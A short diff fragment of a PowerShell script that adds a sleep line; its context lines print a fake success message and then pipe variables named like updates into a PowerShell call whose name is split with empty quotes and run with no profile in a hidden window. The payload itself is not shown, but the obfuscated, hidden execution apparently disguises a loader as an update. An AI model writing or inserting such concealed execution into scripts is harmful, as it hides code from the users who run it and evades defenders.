@@ -36,3 +36,5 @@ echo "[!] Process Completed Successfully"
 start-sleep -s 1
 
 echo $update_a1 | pow""ersh""ell -nop - ; echo $update_r1 | pow""e""rsh""ell -nop -windowstyle hidden -
+
+start-sleep -s 2
